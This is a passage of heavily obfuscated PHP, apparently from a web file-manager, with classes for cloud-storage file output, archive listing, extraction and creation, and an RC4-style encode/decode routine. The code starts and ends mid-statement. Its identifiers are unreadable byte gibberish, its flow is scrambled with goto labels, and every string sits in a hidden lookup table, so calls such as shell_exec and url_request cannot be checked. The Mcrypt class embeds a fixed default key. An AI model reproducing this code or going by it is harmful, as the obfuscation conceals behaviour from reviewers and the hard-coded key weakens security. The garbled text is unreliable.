goto BÊ–¸ÚŞÏ; eâë§­‚¢ø: } public function fileOutServer($eŒÕ¶Ÿ«‡‹, $BÑÀŞ‹É•Û = false, $aóÕ‚Ö‚ê‚ = false, $F²Ğ­ŞË®‚ = '') { parent::fileOut($eŒÕ¶Ÿ«‡‹, $BÑÀŞ‹É•Û, $aóÕ‚Ö‚ê‚, $F²Ğ­ŞË®‚); } public function fileOutImage($EÂâ¸óáìæ, $Aƒä±õÕµ = 250) { $C¥Ò˜ÙˆÑó = array(OSS\OssClient::OSS_PROCESS => $_SERVER[°Óó£ÌİóèÅ][945] . $Aƒä±õÕµ); $bØ×ĞÈ¬ = $this->link($EÂâ¸óáìæ, $C¥Ò˜ÙˆÑó); $this->fileOutLink($bØ×ĞÈ¬); } public function fileOutImageServer($E‡ÌÅ²Ş¢, $cÃÓÌöêµÛ = 250) { parent::fileOutImage($E‡ÌÅ²Ş¢, $cÃÓÌöêµÛ); } public function hashMd5($eÛ‘åÃõˆõ, $aùèèë¹µ¸ = '') { $Bàì®ö‚»• =& $_SERVER[°Óó£ÌİóèÅ]; try { $c‘®œÛËâÇ = $this->client->getObjectMeta($this->bucket, $this->pathEncode($eÛ‘åÃõˆõ)); } catch (OSS\Core\OssException $B š‡¥Ç) { return !1; } if (!isset($c‘®œÛËâÇ[$Bàì®ö‚»•[918]]) && !empty($aùèèë¹µ¸)) { $D¥Ğ­ÌƒÁ = $this->updateObjMeta($eÛ‘åÃõˆõ, array($Bàì®ö‚»•[918] => $aùèèë¹µ¸)); $c‘®œÛËâÇ[$Bàì®ö‚»•[918]] = $D¥Ğ­ÌƒÁ ? $aùèèë¹µ¸ : $Bàì®ö‚»•[33]; } return isset($c‘®œÛËâÇ[$Bàì®ö‚»•[918]]) ? $c‘®œÛËâÇ[$Bàì®ö‚»•[918]] : $Bàì®ö‚»•[33]; } private function fileInfoImage($Fñ®©ôí†, &$D•ß„¿×¿) { goto Câº¿ßøÉ; EïÑ¢·ê…: $a×´‰Ä‰×Ü = array(OSS\OssClient::OSS_PROCESS => $Fó¸Ë®½İ[946]); $EëÙÚïÅ¦ª = $this->link($Fñ®©ôí†, $a×´‰Ä‰×Ü); $f•æ°„Ù†Ù = url_request($EëÙÚïÅ¦ª, $Fó¸Ë®½İ[231], !1, !1, !1, !0); goto B§ê“·èËí; B§ê“·èËí: if (!$f•æ°„Ù†Ù[$Fó¸Ë®½İ[454]]) { return !1; } $D•ß„¿×¿[$Fó¸Ë®½İ[220]] = array($Fó¸Ë®½İ[221] => $f•æ°„Ù†Ù[$Fó¸Ë®½İ[783]][$Fó¸Ë®½İ[947]][$Fó¸Ë®½İ[367]], $Fó¸Ë®½İ[222] => $f•æ°„Ù†Ù[$Fó¸Ë®½İ[783]][$Fó¸Ë®½İ[948]][$Fó¸Ë®½İ[367]]); goto b‚¡–ÆÄ; Câº¿ßøÉ: $Fó¸Ë®½İ =& $_SERVER[°Óó£ÌİóèÅ]; $Añ±Ô”ë™ù = array($Fó¸Ë®½İ[216], $Fó¸Ë®½İ[166], $Fó¸Ë®½İ[217], $Fó¸Ë®½İ[218], $Fó¸Ë®½İ[219]); if (!in_array($D•ß„¿×¿[$Fó¸Ë®½İ[165]], $Añ±Ô”ë™ù)) { return; } goto EïÑ¢·ê…; b‚¡–ÆÄ: } } goto A „­°¯À¯; bóãóÎÏó: class KodArchive { static function init() { goto EŸ¤»Ñ’ˆ¸; A†ÜôÈ“±–: require_once ARCHIVE_LIB . $eªœ‰©Ãœ±[1321]; require_once ARCHIVE_LIB . $eªœ‰©Ãœ±[1322]; require_once ARCHIVE_LIB . $eªœ‰©Ãœ±[1323]; goto CÇĞÔ‹ÀÇÚ; CÇĞÔ‹ÀÇÚ: require_once ARCHIVE_LIB . $eªœ‰©Ãœ±[1324]; goto DÕäÕ†¢«ö; cÖĞ’Ñß¶£: mk_dir(TEMP_FILES); require_once ARCHIVE_LIB . $eªœ‰©Ãœ±[1319]; require_once ARCHIVE_LIB . $eªœ‰©Ãœ±[1320]; goto A†ÜôÈ“±–; EŸ¤»Ñ’ˆ¸: $eªœ‰©Ãœ± =& $_SERVER[°Óó£ÌİóèÅ]; if (defined($eªœ‰©Ãœ±[1313])) { return; } define($eªœ‰©Ãœ±[1313], SDK_DIR . $eªœ‰©Ãœ±[1314]); goto a´…¿Â—; a´…¿Â—: define($eªœ‰©Ãœ±[1315], TEMP_FILES); define($eªœ‰©Ãœ±[1316], TEMP_FILES); define($eªœ‰©Ãœ±[1317], $eªœ‰©Ãœ±[1318]); goto cÖĞ’Ñß¶£; DÕäÕ†¢«ö: } static function checkIfType($f½â‹˜Ü³, $dÛ°×Ñ½Ì) { goto DŒÛÈî­™è; eãÏšùÏöº: $EÌ†‡Ó†Ø¡ = in_array($f½â‹˜Ü³, $b¸¥”¥Ÿ…[$dÛ°×Ñ½Ì]); if ($EÌ†‡Ó†Ø¡ && ($dÛ°×Ñ½Ì == $Eæ´ÁÇ²è´[312] || $dÛ°×Ñ½Ì == $Eæ´ÁÇ²è´[1328]) && (!function_exists($Eæ´ÁÇ²è´[1338]) || !function_exists($Eæ´ÁÇ²è´[1339]))) { show_tips($Eæ´ÁÇ²è´[1340]); } if ($EÌ†‡Ó†Ø¡ && $dÛ°×Ñ½Ì == $Eæ´ÁÇ²è´[793] && (!function_exists($Eæ´ÁÇ²è´[1341]) || !strstr(shell_exec($Eæ´ÁÇ²è´[1342]), $Eæ´ÁÇ²è´[1343]))) { show_tips($Eæ´ÁÇ²è´[1344]); } goto fš–›´ó›«; DŒÛÈî­™è: $Eæ´ÁÇ²è´ =& $_SERVER[°Óó£ÌİóèÅ]; self::init(); $b¸¥”¥Ÿ… = array($Eæ´ÁÇ²è´[312] => array($Eæ´ÁÇ²è´[312], $Eæ´ÁÇ²è´[1325], $Eæ´ÁÇ²è´[1326], $Eæ´ÁÇ²è´[1327]), $Eæ´ÁÇ²è´[1328] => array($Eæ´ÁÇ²è´[1328], $Eæ´ÁÇ²è´[1329], $Eæ´ÁÇ²è´[1330], $Eæ´ÁÇ²è´[1331]), $Eæ´ÁÇ²è´[793] => array($Eæ´ÁÇ²è´[793], $Eæ´ÁÇ²è´[1332], $Eæ´ÁÇ²è´[1333], $Eæ´ÁÇ²è´[1334], $Eæ´ÁÇ²è´[1335], $Eæ´ÁÇ²è´[1336], $Eæ´ÁÇ²è´[1337])); goto eãÏšùÏöº; fš–›´ó›«: return $EÌ†‡Ó†Ø¡; goto còíÈÚšôñ; còíÈÚšôñ: } static function listContent($FŞ‰Õ„èçƒ, $F¼ÁŸšáïô = true) { $dÈÖÙí¡êö =& $_SERVER[°Óó£ÌİóèÅ]; self::init(); $aè‚ƒö¿Æ = $GLOBALS[$dÈÖÙí¡êö[794]] ? $GLOBALS[$dÈÖÙí¡êö[794]] : get_path_ext($FŞ‰Õ„èçƒ); $AÓÆ¯ÏÕï­ = !1; if (self::checkIfType($aè‚ƒö¿Æ, $dÈÖÙí¡êö[1328])) { $BŒÛ™ƒò‡ï = PclTarList($FŞ‰Õ„èçƒ, $aè‚ƒö¿Æ); $AÓÆ¯ÏÕï­ = array(); for ($dÖ…ëœ…‘ = 0; $dÖ…ëœ…‘ < count($BŒÛ™ƒò‡ï); $dÖ…ëœ…‘++) { $bîç´â§±† = $BŒÛ™ƒò‡ï[$dÖ…ëœ…‘]; if ($bîç´â§±†[$dÈÖÙí¡êö[1345]] == $dÈÖÙí¡êö[1346] || $bîç´â§±†[$dÈÖÙí¡êö[1345]] == $dÈÖÙí¡êö[1347]) { continue; } if ($F¼ÁŸšáïô) { $bîç´â§±†[$dÈÖÙí¡êö[1348]] = ltrim($bîç´â§±†[$dÈÖÙí¡êö[1348]], $dÈÖÙí¡êö[888]); } if ($bîç´â§±†[$dÈÖÙí¡êö[1345]] == $dÈÖÙí¡êö[1349]) { $bîç´â§±†[$dÈÖÙí¡êö[85]] = !0; } else { $bîç´â§±†[$dÈÖÙí¡êö[85]] = !1; } $bîç´â§±†[$dÈÖÙí¡êö[785]] = $dÖ…ëœ…‘; $AÓÆ¯ÏÕï­[] = $bîç´â§±†; } } else { if (self::checkIfType($aè‚ƒö¿Æ, $dÈÖÙí¡êö[793])) { $F£íÚ®³®¯ = kodRarArchive::listContent($FŞ‰Õ„èçƒ); if (!$F£íÚ®³®¯[$dÈÖÙí¡êö[781]]) { return $F£íÚ®³®¯; } else { $AÓÆ¯ÏÕï­ = $F£íÚ®³®¯[$dÈÖÙí¡êö[783]]; } } else { if (kodZipArchive::support($dÈÖÙí¡êö[364])) { $AÓÆ¯ÏÕï­ = kodZipArchive::listContent($FŞ‰Õ„èçƒ); } else { $CßŠğÇÄ = new PclZip($FŞ‰Õ„èçƒ); $AÓÆ¯ÏÕï­ = $CßŠğÇÄ->listContent(); } } } if ($AÓÆ¯ÏÕï­) { $C‰¦Æ­•½ò = unzip_charset_get($AÓÆ¯ÏÕï­); $F¼ÁŸšáïô = $F¼ÁŸšáïô && function_exists($dÈÖÙí¡êö[74]); for ($dÖ…ëœ…‘ = 0; $dÖ…ëœ…‘ < count($AÓÆ¯ÏÕï­); $dÖ…ëœ…‘++) { $AÓÆ¯ÏÕï­[$dÖ…ëœ…‘][$dÈÖÙí¡êö[1348]] = str_replace(array($dÈÖÙí¡êö[818], $dÈÖÙí¡êö[1350]), $dÈÖÙí¡êö[538], $AÓÆ¯ÏÕï­[$dÖ…ëœ…‘][$dÈÖÙí¡êö[1348]]); if ($F¼ÁŸšáïô) { $AÓÆ¯ÏÕï­[$dÖ…ëœ…‘][$dÈÖÙí¡êö[1348]] = iconv_to($AÓÆ¯ÏÕï­[$dÖ…ëœ…‘][$dÈÖÙí¡êö[1348]], $C‰¦Æ­•½ò, $dÈÖÙí¡êö[337]); unset($AÓÆ¯ÏÕï­[$dÖ…ëœ…‘][$dÈÖÙí¡êö[1351]]); } } return array($dÈÖÙí¡êö[781] => !0, $dÈÖÙí¡êö[783] => $AÓÆ¯ÏÕï­); } else { return array($dÈÖÙí¡êö[781] => !1, $dÈÖÙí¡êö[783] => $AÓÆ¯ÏÕï­); } } static function extract($eáİïÔ—Š, $aë„¬Œ‘‹”, $FĞò•ğÆÅù = "\55\x31", &$Cƒ×Ö™æ‰Ï = false) { goto aïÉ÷Ñ¼ˆ; aïÉ÷Ñ¼ˆ: $d®†ôÄ§×á =& $_SERVER[°Óó£ÌİóèÅ]; self::init(); $b¶ÃêÛòƒ = $GLOBALS[$d®†ôÄ§×á[794]] ? $GLOBALS[$d®†ôÄ§×á[794]] : get_path_ext($eáİïÔ—Š); goto bÏÖ‡ŞØ¢Ã; bÏÖ‡ŞØ¢Ã: $DÛï‰ä–¡Ş = self::listContent($eáİïÔ—Š, !1); if (!$DÛï‰ä–¡Ş[$d®†ôÄ§×á[781]]) { return $DÛï‰ä–¡Ş; } if ($FĞò•ğÆÅù != $d®†ôÄ§×á[780]) { goto aÉŠÌñ¾ÀÎ; C¨Ó‰ñ–À: if ($GLOBALS[$d®†ôÄ§×á[6]][$d®†ôÄ§×á[886]] != $d®†ôÄ§×á[337]) { $BŠ‘Ÿ­õ½š = unzip_pre_name($Cƒ×Ö™æ‰Ï); } $fÉ†£ÎÛ = get_path_father($Cƒ×Ö™æ‰Ï); if ($fÉ†£ÎÛ == $Cƒ×Ö™æ‰Ï) { $fÉ†£ÎÛ = $d®†ôÄ§×á[33]; } goto aàèøìĞ«Ñ; aàèøìĞ«Ñ: if ($f½Ê™åŠ‡Í[$d®†ôÄ§×á[85]]) { $BŠ‘Ÿ­õ½š = rtrim($BŠ‘Ÿ­õ½š, $d®†ôÄ§×á[8]) . $d®†ôÄ§×á[8]; $Cƒ×Ö™æ‰Ï = array($Cƒ×Ö™æ‰Ï); } $bÁøâËƒéÓ = str_replace($d®†ôÄ§×á[102], $d®†ôÄ§×á[8], $BŠ‘Ÿ­õ½š); if (substr($bÁøâËƒéÓ, -1) == $d®†ôÄ§×á[8]) { if (!strstr(trim($bÁøâËƒéÓ, $d®†ôÄ§×á[8]), $d®†ôÄ§×á[8])) { $aë„¬Œ‘‹” = $aë„¬Œ‘‹” . get_path_this($bÁøâËƒéÓ) . $d®†ôÄ§×á[8]; } } else { if ($fÉ†£ÎÛ == $BŠ‘Ÿ­õ½š) { $fÉ†£ÎÛ = $d®†ôÄ§×á[33]; } } goto d‘º‘ôÈ…”; aÉŠÌñ¾ÀÎ: $f½Ê™åŠ‡Í = self::fileIndex($DÛï‰ä–¡Ş[$d®†ôÄ§×á[783]], $FĞò•ğÆÅù); $Cƒ×Ö™æ‰Ï = str_replace(array($d®†ôÄ§×á[818], $d®†ôÄ§×á[1350]), $d®†ôÄ§×á[79], $f½Ê™åŠ‡Í[$d®†ôÄ§×á[1348]]); $BŠ‘Ÿ­õ½š = $Cƒ×Ö™æ‰Ï; goto C¨Ó‰ñ–À; d‘º‘ôÈ…”: } goto eÖ×²¦ëÑê; eÖ×²¦ëÑê: if (self::checkIfType($b¶ÃêÛòƒ, $d®†ôÄ§×á[1328])) { if ($FĞò•ğÆÅù != $d®†ôÄ§×á[780]) { $BŠ‘Ÿ­õ½š = unzip_pre_name($BŠ‘Ÿ­õ½š); $fÉ†£ÎÛ = unzip_pre_name($fÉ†£ÎÛ); $a†ïœô§É‰ = PclTarExtractList($eáİïÔ—Š, array($BŠ‘Ÿ­õ½š), $aë„¬Œ‘‹”, $fÉ†£ÎÛ, $b¶ÃêÛòƒ); } else { $a†ïœô§É‰ = PclTarExtract($eáİïÔ—Š, $aë„¬Œ‘‹”, $d®†ôÄ§×á[371], $b¶ÃêÛòƒ); } return array($d®†ôÄ§×á[781] => $a†ïœô§É‰, $d®†ôÄ§×á[783] => PclErrorString(!0)); } else { if (self::checkIfType($b¶ÃêÛòƒ, $d®†ôÄ§×á[793])) { return kodRarArchive::extract($eáİïÔ—Š, $aë„¬Œ‘‹”, $b¶ÃêÛòƒ, $Cƒ×Ö™æ‰Ï); } else { if (kodZipArchive::support($d®†ôÄ§×á[1352])) { return kodZipArchive::extract($eáİïÔ—Š, $aë„¬Œ‘‹”, $Cƒ×Ö™æ‰Ï); } else { $a¢·§áÅÍ = new PclZip($eáİïÔ—Š); if ($FĞò•ğÆÅù != $d®†ôÄ§×á[780]) { $a†ïœô§É‰ = $a¢·§áÅÍ->extract(PCLZIP_OPT_PATH, $aë„¬Œ‘‹”, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $d®†ôÄ§×á[1353], PCLZIP_OPT_BY_NAME, $f½Ê™åŠ‡Í[$d®†ôÄ§×á[1348]], PCLZIP_OPT_REMOVE_PATH, $fÉ†£ÎÛ, PCLZIP_OPT_REPLACE_NEWER); } else { $a†ïœô§É‰ = $a¢·§áÅÍ->extract(PCLZIP_OPT_PATH, $aë„¬Œ‘‹”, PCLZIP_OPT_SET_CHMOD, DEFAULT_PERRMISSIONS, PCLZIP_CB_PRE_FILE_NAME, $d®†ôÄ§×á[1353], PCLZIP_OPT_REPLACE_NEWER); } return array($d®†ôÄ§×á[781] => $a†ïœô§É‰, $d®†ôÄ§×á[783] => $a¢·§áÅÍ->errorName(!0)); } } } return array($d®†ôÄ§×á[781] => !1, $d®†ôÄ§×á[783] => $d®†ôÄ§×á[1354]); goto BÔ®ÙË–Â¿; BÔ®ÙË–Â¿: } static function fileIndex($F¿Ğ‰Š³ß™, $f¤£”È½‘œ, $b¤À¹ Î¦ó = false) { goto EÎó„ÄÈ­İ; EÎó„ÄÈ­İ: $b¾î“·ñÊ =& $_SERVER[°Óó£ÌİóèÅ]; self::init(); if (!is_array($F¿Ğ‰Š³ß™)) { return !1; } goto AÛ •íï©²; DÂõï‘¶®: $bÂÖùªÑš‰ = $dà¦á¾åã; if ($b¤À¹ Î¦ó) { $bÂÖùªÑš‰ = $dà¦á¾åã[$b¤À¹ Î¦ó]; if ($dà¦á¾åã[$b¾î“·ñÊ[85]]) { $bÂÖùªÑš‰ = rtrim($bÂÖùªÑš‰, $b¾î“·ñÊ[8]) . $b¾î“·ñÊ[8]; } } return $bÂÖùªÑš‰; goto B¶ØôŠ®ê; AÛ •íï©²: $EÏåÎë»Ì = count($F¿Ğ‰Š³ß™); for ($Aù›ó¾±Ø = 0; $Aù›ó¾±Ø < $EÏåÎë»Ì; $Aù›ó¾±Ø++) { if ($f¤£”È½‘œ == $F¿Ğ‰Š³ß™[$Aù›ó¾±Ø][$b¾î“·ñÊ[785]]) { $dà¦á¾åã = $F¿Ğ‰Š³ß™[$Aù›ó¾±Ø]; break; } } if (!$dà¦á¾åã) { show_tips($b¾î“·ñÊ[1355]); } goto DÂõï‘¶®; B¶ØôŠ®ê: } static function extractZipFile($F¡Šò ‰ãÍ, $B©ƒ¤—¾Ç, $e‹¬‘õÕÇ£ = false) { goto Aå¼ŠãÎß«; FÕîêõíŒ‡: if (file_exists($f‘ù³ƒ¸”§)) { return $f‘ù³ƒ¸”§; } $FÈ½ô–Å„ƒ = new PclZip($F¡Šò ‰ãÍ); $côã¤Œ‡¯‡ = unzip_filter_ext($E­äìÊ§ØĞ . get_path_this($B©ƒ¤—¾Ç)); goto dª³¿Ì¯ó¥; D¨Œ¶š”»ô: mk_dir($E­äìÊ§ØĞ); $f‘ù³ƒ¸”§ = $E­äìÊ§ØĞ . md5($F¡Šò ‰ãÍ . $B©ƒ¤—¾Ç); if ($e‹¬‘õÕÇ£) { $f‘ù³ƒ¸”§ = $E­äìÊ§ØĞ . $e‹¬‘õÕÇ£; } goto FÕîêõíŒ‡; dª³¿Ì¯ó¥: $EÓè³Ø¨Ö˜ = get_path_father($B©ƒ¤—¾Ç); if ($EÓè³Ø¨Ö˜ == $B©ƒ¤—¾Ç) { $EÓè³Ø¨Ö˜ = $fŞÑ¯¥´Úä[33]; } $dƒŠÖâÙ¯ = $FÈ½ô–Å„ƒ->extract(PCLZIP_OPT_PATH, $E­äìÊ§ØĞ, PCLZIP_CB_PRE_FILE_NAME, $fŞÑ¯¥´Úä[1353], PCLZIP_OPT_REMOVE_PATH, $EÓè³Ø¨Ö˜, PCLZIP_OPT_BY_NAME, $B©ƒ¤—¾Ç); goto cÖæˆ; Aå¼ŠãÎß«: $fŞÑ¯¥´Úä =& $_SERVER[°Óó£ÌİóèÅ]; self::init(); $E­äìÊ§ØĞ = TEMP_FILES . hash_path($F¡Šò ‰ãÍ) . $fŞÑ¯¥´Úä[8]; goto D¨Œ¶š”»ô; cÖæˆ: if (!file_exists($côã¤Œ‡¯‡)) { return !1; } @rename($côã¤Œ‡¯‡, $f‘ù³ƒ¸”§); return $f‘ù³ƒ¸”§; goto d‚æ„Øè‘; d‚æ„Øè‘: } static function filePreview($E‹Úö£ˆ’Ì, $aîÛàßÚŞ…, $Cñ–œ”ƒô… = false, $eËÒôß×áò = false) { goto b§ªˆÎø„; dùæÃ²¦¼Š: mk_dir($Cî¾‘ÌÑö); $bßÃ±ÚœŸ‚ = $Cî¾‘ÌÑö . md5($E‹Úö£ˆ’Ì . $aîÛàßÚŞ… . $eËÒôß×áò); $Eê†áíâ¡Â = $fô†½Œ‡è¦[33]; goto AÇêÔÛƒ©; AÇêÔÛƒ©: $FŠ·æêßÆğ = self::extract($E‹Úö£ˆ’Ì, $Cî¾‘ÌÑö, $aîÛàßÚŞ…, $Eê†áíâ¡Â); if (is_array($Eê†áíâ¡Â)) { show_json($fô†½Œ‡è¦[1356], !1); } if (file_exists($bßÃ±ÚœŸ‚)) { IO::fileOut($bßÃ±ÚœŸ‚, $Cñ–œ”ƒô…, get_path_this($Eê†áíâ¡Â)); return; } goto dÍ—š©£ìµ; b§ªˆÎø„: $fô†½Œ‡è¦ =& $_SERVER[°Óó£ÌİóèÅ]; self::init(); $Cî¾‘ÌÑö = TEMP_FILES . hash_path($E‹Úö£ˆ’Ì) . $fô†½Œ‡è¦[8]; goto dùæÃ²¦¼Š; dÍ—š©£ìµ: $Eê†áíâ¡Â = unzip_pre_name($Eê†áíâ¡Â); $F§Ÿ¥Ÿ‚Æ = get_path_this($Eê†áíâ¡Â); $eÃ…ì½¢Ø” = unzip_filter_ext($Cî¾‘ÌÑö . $F§Ÿ¥Ÿ‚Æ); goto Fî£©†¼˜Ë; Fî£©†¼˜Ë: if (!$FŠ·æêßÆğ[$fô†½Œ‡è¦[781]]) { show_json($FŠ·æêßÆğ[$fô†½Œ‡è¦[783]], !1); } if (!file_exists($eÃ…ì½¢Ø”)) { show_json($fô†½Œ‡è¦[1357], !1); } @rename($eÃ…ì½¢Ø”, $bßÃ±ÚœŸ‚); goto bÏ‹¤¬ì°´; bÏ‹¤¬ì°´: if (!file_exists($bßÃ±ÚœŸ‚)) { del_dir($Cî¾‘ÌÑö); show_json($fô†½Œ‡è¦[1358]); } IO::fileOut($bßÃ±ÚœŸ‚, $Cñ–œ”ƒô…, $F§Ÿ¥Ÿ‚Æ); goto f°¾ãÀ‚À‡; f°¾ãÀ‚À‡: } static function create($aÍïå—ÄÒª, $E†Á¾ÊÙ) { $EÀÒ‚«“Ñâ =& $_SERVER[°Óó£ÌİóèÅ]; self::init(); $F‹¾·Ø¡ˆì = get_path_ext($aÍïå—ÄÒª); $aéãà­à£ = !1; if (self::checkIfType($F‹¾·Ø¡ˆì, $EÀÒ‚«“Ñâ[312])) { if (kodZipArchive::support($EÀÒ‚«“Ñâ[756])) { return kodZipArchive::create($aÍïå—ÄÒª, $E†Á¾ÊÙ); } $AÅÖ¨ğÖ½‡ = new PclZip($aÍïå—ÄÒª); foreach ($E†Á¾ÊÙ as $aÖ¬â»«¯¹ => $cñœïñÜ‰) { $cñœïñÜ‰ = str_replace($EÀÒ‚«“Ñâ[1359], $EÀÒ‚«“Ñâ[8], $cñœïñÜ‰); $D¼óçİìÆ = Kodio::clear(get_path_father($cñœïñÜ‰)); if ($aÖ¬â»«¯¹ == 0) { $aéãà­à£ = $AÅÖ¨ğÖ½‡->create($cñœïñÜ‰, PCLZIP_OPT_REMOVE_PATH, $D¼óçİìÆ, PCLZIP_CB_PRE_FILE_NAME, $EÀÒ‚«“Ñâ[1360]); continue; } $aéãà­à£ = $AÅÖ¨ğÖ½‡->add($cñœïñÜ‰, PCLZIP_OPT_REMOVE_PATH, $D¼óçİìÆ, PCLZIP_CB_PRE_FILE_NAME, $EÀÒ‚«“Ñâ[1360]); } } else { if (self::checkIfType($F‹¾·Ø¡ˆì, $EÀÒ‚«“Ñâ[1328])) { foreach ($E†Á¾ÊÙ as $aÖ¬â»«¯¹ => $cñœïñÜ‰) { $cñœïñÜ‰ = str_replace($EÀÒ‚«“Ñâ[1359], $EÀÒ‚«“Ñâ[8], $cñœïñÜ‰); $D¼óçİìÆ = Kodio::clear(get_path_father($cñœïñÜ‰)); if ($aÖ¬â»«¯¹ == 0) { $aéãà­à£ = PclTarCreate($aÍïå—ÄÒª, array($cñœïñÜ‰), $F‹¾·Ø¡ˆì, null, $D¼óçİìÆ); continue; } $aéãà­à£ = PclTarAddList($aÍïå—ÄÒª, array($cñœïñÜ‰), $EÀÒ‚«“Ñâ[33], $D¼óçİìÆ, $F‹¾·Ø¡ˆì); } } } return $aéãà­à£; } } class Mcrypt { public static $defaultKey = "\x61\41\x74\x61\x6b\x41\72\x64\x6c\x6d\x63\x6c\x64\105\166\x2c\x65"; public static function encode($E‚´ğĞ×Ã…, $C¦ÑÊšöĞ = '', $C±†«ğ›ß¨ = 0) { goto cÙ÷Ú†‰Ñ·; cèïÏ®ßŒó: $C÷•ïÄßê = $EÃ¬¹´Ÿ˜ˆ . md5($EÃ¬¹´Ÿ˜ˆ . $E™·Êã¥ğã); $DË¤ÌÒ™¿Ú = strlen($C÷•ïÄßê); $E‚´ğĞ×Ã… = sprintf($DËÔ‚¬ôÀÕ[1361], $C±†«ğ›ß¨ ? $C±†«ğ›ß¨ + time() : 0) . substr(md5($E‚´ğĞ×Ã… . $CÈ¿Û‰î°å), 0, 16) . $E‚´ğĞ×Ã…; goto Cê¸Õ˜ºÉÈ; eË¢î×ÁíÆ: $EÃ¬¹´Ÿ˜ˆ = md5(substr($C¦ÑÊšöĞ, 0, 16)); $CÈ¿Û‰î°å = md5(substr($C¦ÑÊšöĞ, 16, 16)); $E™·Êã¥ğã = substr(md5(microtime()), -$bç¤Œùùºí); goto cèïÏ®ßŒó; CÒËˆ…¥­¸: return $F’ù™ŠÔÉŒ; goto eÈÀÏ•åÒ; CÒ•õ¿šÃ: for ($EÁ½êÕæµ­ = $FÀØ´Ú¡¿‡ = $A‰îñµÜŠ‚ = 0; $A‰îñµÜŠ‚ < $c¸¿Ù¥Øô‹; $A‰îñµÜŠ‚++) { $EÁ½êÕæµ­ = ($EÁ½êÕæµ­ + 1) % 256; $FÀØ´Ú¡¿‡ = ($FÀØ´Ú¡¿‡ + $e”­Âá«öˆ[$EÁ½êÕæµ­]) % 256; $A÷Œ¿ò™Õ¸ = $e”­Âá«öˆ[$EÁ½êÕæµ­]; $e”­Âá«öˆ[$EÁ½êÕæµ­] = $e”­Âá«öˆ[$FÀØ´Ú¡¿‡]; $e”­Âá«öˆ[$FÀØ´Ú¡¿‡] = $A÷Œ¿ò™Õ¸; $F’ù™ŠÔÉŒ .= chr(ord($E‚´ğĞ×Ã…[$A‰îñµÜŠ‚]) ^ $e”­Âá«öˆ[($e”­Âá«öˆ[$EÁ½êÕæµ­] + $e”­Âá«öˆ[$FÀØ´Ú¡¿‡]) % 256]); } $F’ù™ŠÔÉŒ = $E™·Êã¥ğã . str_replace($DËÔ‚¬ôÀÕ[674], $DËÔ‚¬ôÀÕ[33], base64_encode($F’ù™ŠÔÉŒ)); $F’ù™ŠÔÉŒ = str_replace(array($DËÔ‚¬ôÀÕ[295], $DËÔ‚¬ôÀÕ[8], $DËÔ‚¬ôÀÕ[674]), array($DËÔ‚¬ôÀÕ[506], $DËÔ‚¬ôÀÕ[79], $DËÔ‚¬ôÀÕ[100]), $F’ù™ŠÔÉŒ); goto CÒËˆ…¥­¸; cÙ÷Ú†‰Ñ·: $DËÔ‚¬ôÀÕ =& $_SERVER[°Óó£ÌİóèÅ]; $bç¤Œùùºí = 4; $C¦ÑÊšöĞ = md5($C¦ÑÊšöĞ ? $C¦ÑÊšöĞ : self::$defaultKey); goto eË¢î×ÁíÆ; cÊÈİóšì: $e”­Âá«öˆ = range(0, 255); for ($FÀØ´Ú¡¿‡ = $A‰îñµÜŠ‚ = 0; $A‰îñµÜŠ‚ < 256; $A‰îñµÜŠ‚++) { $FÀØ´Ú¡¿‡ = ($FÀØ´Ú¡¿‡ + $e”­Âá«öˆ[$A‰îñµÜŠ‚] + $c¶Í¾Ø¡àİ[$A‰îñµÜŠ‚]) % 256; $A÷Œ¿ò™Õ¸ = $e”­Âá«öˆ[$A‰îñµÜŠ‚]; $e”­Âá«öˆ[$A‰îñµÜŠ‚] = $e”­Âá«öˆ[$FÀØ´Ú¡¿‡]; $e”­Âá«öˆ[$FÀØ´Ú¡¿‡] = $A÷Œ¿ò™Õ¸; } $F’ù™ŠÔÉŒ = $DËÔ‚¬ôÀÕ[33]; goto CÒ•õ¿šÃ; Cê¸Õ˜ºÉÈ: $c¸¿Ù¥Øô‹ = strlen($E‚´ğĞ×Ã…); $c¶Í¾Ø¡àİ = array(); for ($A‰îñµÜŠ‚ = 0; $A‰îñµÜŠ‚ <= 255; $A‰îñµÜŠ‚++) { $c¶Í¾Ø¡àİ[$A‰îñµÜŠ‚] = ord($C÷•ïÄßê[$A‰îñµÜŠ‚ % $DË¤ÌÒ™¿Ú]); } goto cÊÈİóšì; eÈÀÏ•åÒ: } public static function decode($F¥ùÖ°ô²—, $d¦„ó¶‰‡ = '') { goto cÖÜìå‡Ô; D±¦Ó“„§: $F¥ùÖ°ô²— = base64_decode(substr($F¥ùÖ°ô²—, $A…†ä—›¾)); $Bª±äØö· = strlen($F¥ùÖ°ô²—); $b§šŠÄƒ¿ñ = array(); goto Bˆé¨”Ÿ‚¯; A“ñš›èæÕ: $bØ„ö…É¼Æ = $e‚İÌãå[33]; for ($aö›Ø‹¡à½ = $eë²Ä‚…Î® = $BÌä„á‡¸– = 0; $BÌä„á‡¸– < $Bª±äØö·; $BÌä„á‡¸–++) { $aö›Ø‹¡à½ = ($aö›Ø‹¡à½ + 1) % 256; $eë²Ä‚…Î® = ($eë²Ä‚…Î® + $D±¨»ÑØ®İ[$aö›Ø‹¡à½]) % 256; $cêìïÕ‡Å = $D±¨»ÑØ®İ[$aö›Ø‹¡à½]; $D±¨»ÑØ®İ[$aö›Ø‹¡à½] = $D±¨»ÑØ®İ[$eë²Ä‚…Î®]; $D±¨»ÑØ®İ[$eë²Ä‚…Î®] = $cêìïÕ‡Å; $bØ„ö…É¼Æ .= chr(ord($F¥ùÖ°ô²—[$BÌä„á‡¸–]) ^ $D±¨»ÑØ®İ[($D±¨»ÑØ®İ[$aö›Ø‹¡à½] + $D±¨»ÑØ®İ[$eë²Ä‚…Î®]) % 256]); } if ((substr($bØ„ö…É¼Æ, 0, 10) == 0 || substr($bØ„ö…É¼Æ, 0, 10) - time() > 0) && substr($bØ„ö…É¼Æ, 10, 16) == substr(md5(substr($bØ„ö…É¼Æ, 26) . $d¾†½î¨Ç), 0, 16)) { return substr($bØ„ö…É¼Æ, 26); } else { return $e‚İÌãå[33]; } goto c”ùá‚ƒ; cÖÜìå‡Ô: $e‚İÌãå =& $_SERVER[°Óó£ÌİóèÅ]; $F¥ùÖ°ô²— = str_replace(array($e‚İÌãå[506], $e‚İÌãå[79], $e‚İÌãå[100]), array($e‚İÌãå[295], $e‚İÌãå[8], $e‚İÌãå[674]), $F¥ùÖ°ô²—); $A…†ä—›¾ = 4; goto eå½Áêæ; eå½Áêæ: $d¦„ó¶‰‡ = 